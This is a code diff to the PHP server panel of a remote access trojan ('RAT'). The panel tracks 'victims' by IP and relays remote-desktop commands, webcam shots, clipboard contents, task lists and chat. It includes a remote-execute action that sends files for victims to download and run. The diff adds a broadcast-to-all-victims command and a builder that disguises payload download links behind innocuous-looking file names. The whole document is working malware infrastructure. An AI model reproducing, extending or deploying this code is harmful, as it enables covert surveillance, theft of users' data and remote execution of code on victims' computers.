@@ -24,6 +24,7 @@ $actioncontent5 = $_GET["actioncontent5"];                                      
 $victim = $_SERVER['REMOTE_ADDR'];                                                           // victim return page visitor ip (on used occurence the victim IP)  
 $actionid = randomstring(5);                                                                 // actionid is used when sending a message in chatbox(check if message is not the same)
 $date = date("[H:i:s d-m-Y]");                                                               // date is here in case i need it
+$servip = $_SERVER['SERVER_ADDR'];                                                           // VPS IP used when building the rat
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 
@@ -41,6 +42,7 @@ $date = date("[H:i:s d-m-Y]");                                                  
 
 // writeme is used when victim send his status
 if ($action == "writeme") {
+  echo cache_get($victim . "actions");
 // When victim browse, it will try to create the if doesn't exist
 // $victim = Refer to line 10
 if (!is_dir("victims/$victim")) {mkdir("victims/$victim", 0777); chmod("victims/" . $victim, 0777);}
@@ -70,16 +72,15 @@ mkdir("logs/$victim/camerashot"); chmod("logs/$victim/camerashot", 0777);
 // we set in target . adminchat (= 1.2.3.4adminchat) datas about the chat :
 // $actioncontent = Show in victim Taskbar ? (0 No // 1 Yes)      /// $actionconent2 = Always on top ? (0 No // 1 Yes)    /// $actioncontent3= Victim can close chat ? (0 No // 1 Yes)
 // $actioncontent4 get transformet in $encrypted in Base64 to avoir string escape
-if ($action == "adminsend") {$encrypted = base64_encode($actioncontent4);   cache_set($target . "adminchat" , "$actioncontent|$actioncontent2|$actioncontent3|$encrypted|$actionid"); }
+if ($action == "adminsend") {     cache_set($target . "adminchat" , "$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actionid"); }
 // adminrecieve return encrypted message in base64 and actionID (refer to line 19)
 if ($action == "adminreceive") {     echo(cache_get($target . "clientchat"));     }
 // we set in victim . clientchat (= 1.2.3.4clientchat) datas about the chat :
 // $encrypted is base64 string containing message content and actionID (refer to line 19)
-if ($action == "clientsend") {     $encrypted = base64_encode($actioncontent);   cache_set($victim . "clientchat", "$encrypted|$actionid");     }
+if ($action == "clientsend") {     cache_set($victim . "clientchat", "$actioncontent|$actionid");     }
 // clientrecieve return encrypted message in base64 with all informations about tchatbox (should i be always on top ? can i close the chat ? etc..)
 if ($action == "clientreceive") {     echo(cache_get($victim . "adminchat"));     }	
 ///////////////////////////////////////////////////////
-
 
 // Send instruction to do to $target . action (= 1.2.3.4actions) with actiontype (start remote desktop) and actioncontent for different action
 if ($action == "senddata") {    cache_set($target . "actions", "$actiontype|$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actioncontent5");  }
@@ -95,8 +96,7 @@ if ($action == "uploadcamerashot") {    $byte = file_get_contents("php://input")
 
 // Recieved file by panel is in files in $actioncontent as file name
 if ($action == "remoteexec") { move_uploaded_file($_FILES["file"]["tmp_name"], "files/$actioncontent");
-
-// Send instruction to victim to download the file & exec it (remotexec directly refer to files folder on server & $actioncontent as file name)
+// Send instruction to victim to download the file & exec it (remotexec directly refer to files folder on server & $actioncontent as filename)
 cache_set($victim . "actions" , "remotexec|$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4");  }
 ///////////////////////////////////////////////////////
 
@@ -120,6 +120,33 @@ if ($action == "sendcords") {	cache_set($target . "mousecords" , "$actioncontent
 if ($action == "getcords") {	echo cache_get($victim . "mousecords"); cache_set($victim . "mousecords","");	}
 ///////////////////////////////////////////////////////
 
+// Action @everyone is used by pannel to send instruction to ALL victims actualy Online
+if ($action == "@everyone") {	 $victims = array_diff(scandir('victims/'), array('.', '..'));
+foreach($victims as $list){ cache_set($list . "action" ,"$actioncontent|$actioncontent2|$actioncontent3|$actioncontent4|$actioncontent5"); 	}	}
+
+// Datas send / recieved correctly but didn't finished victim to send instruction & pannel to recieve
+if ($action == "sendtasks") {	cache_set($victim . "taskmgr" , "$actioncontent");	}
+if ($action == "gettasks") {	echo(cache_get($target . "taskmgr"));	cache_set($target . "taskmgr",""); }
+///////////////////////////////////////////////////////
+
+// Clipboard send / return by  pannel to stub
+if ($action == "sendclipboard") { cache_set($victim . "clipboard" , "$actioncontent");  }
+if ($action == "getclipboard") {  echo(cache_get($target . "clipboard")); cache_set($target . "clipboard",""); }
+///////////////////////////////////////////////////////
+
+// Stats send / return by pannel to stub
+if ($action == "sendstatistics") { cache_set($victim . "statistics" , "$actioncontent");  }
+if ($action == "getstatistics") {  echo(cache_get($target . "statistics")); cache_set($target . "statistics",""); }
+///////////////////////////////////////////////////////
+
+
+// Not working because we need to get VPS file path to send it to convertmp3 (wich use public link to convert file..........)
+// if ($action == "playmp3") {
+// $filename = randomstring(10) . ".wav";
+// move_uploaded_file($_FILES["file"]["tmp_name"], "files/$actioncontent");
+// convertmp3("files/" . $actioncontent,  $filename);
+// cache_set($victim . "actions" , "playmp3|$filename|$actioncontent2|$actioncontent3|$actioncontent4");
+// }
 	
 // Clean it is send  by panel every interval to clear the folder (refer line 34)
 // And get stats for the victim
@@ -130,8 +157,10 @@ if ($action == "cleanit") {     $victims = array_diff(scandir('victims/'), array
 // Maybe will put the max uptime to 6
 foreach($victims as $list){
 $dir = stat("victims/$list");
-$olddate =  Time() - 4;
-if ($dir['mtime'] < $olddate) { exec("rm -r victims/$list"); } else {echo (cache_get($list . "stats")); }
+if ($dir['mtime'] < (Time() - 4)) { 
+exec("rm -r victims/$list"); 
+cache_set($list . "adminchat" , ""); cache_set($list . "clientchat" , ""); cache_set($list . "target" , ""); 
+} else {echo (cache_get($list . "stats"));		}
 
 }
 
@@ -154,6 +183,28 @@ if ($dir['mtime'] < $olddate) { exec("rm -r victims/$list"); } else {echo (cache
 //        file_put_contents($loc , $content . "<br>", FILE_APPEND);}
 //
 /////////////////////////////////////////////////////////
+
+
+
+// BUILDER FILE CREATOR
+if ($action == "buildrat") {
+$foldername = array("videourl" ,"uploads", "profiles" , "readme" , "versions", "updates");
+$phpfiles = array("download.php" , "profile.php", "scanner.php", "install.php" , "update.php" , "images.php" , "browse.php" , "logout.php");
+$extensiontype = array("?phpid=" , "?fileid=", "?executable=", "?filename=" ,"?id=", "?imagepath=", "?version=","?number=" , "?date=" , "?password=");
+$selectedfoldername = $foldername[mt_rand(0, count($foldername) - 1)];
+$selectedphpfile = $phpfiles[mt_rand(0, count($phpfiles) - 1)];
+$selectedextensiontype = $extensiontype[mt_rand(0, count($extensiontype) - 1)];
+if (!is_dir("$selectedfoldername")) { mkdir("$selectedfoldername", 0777); chmod("$selectedfoldername", 0777);}
+$template = file_get_contents("download.php");
+if (!file_exists("$selectedfoldername/$selectedphpfile")) { file_put_contents("$selectedfoldername/$selectedphpfile" , $template);}
+$totalpath = "$selectedfoldername/$selectedphpfile$selectedextensiontype";
+$fpath = base64_encode("files/" . randomstring(10) . ".exe");
+echo "http://" . $servip . "/RATZ/" . $totalpath . $fpath;
+}
+
+
+
+
 
 
 
@@ -185,4 +236,9 @@ function randomstring($n) {
      }
 return $randomString;      } 
 /////////////////////////////////////////////////
+function convertmp3($url,$filename){
+$data = json_decode(file_get_contents('http://api.rest7.com/v1/sound_convert.php?url=' . $url . '&format=wav'));
+$wave = file_get_contents($data->file);
+file_put_contents("files/" . $filename , $wave);
+}
 ?> 
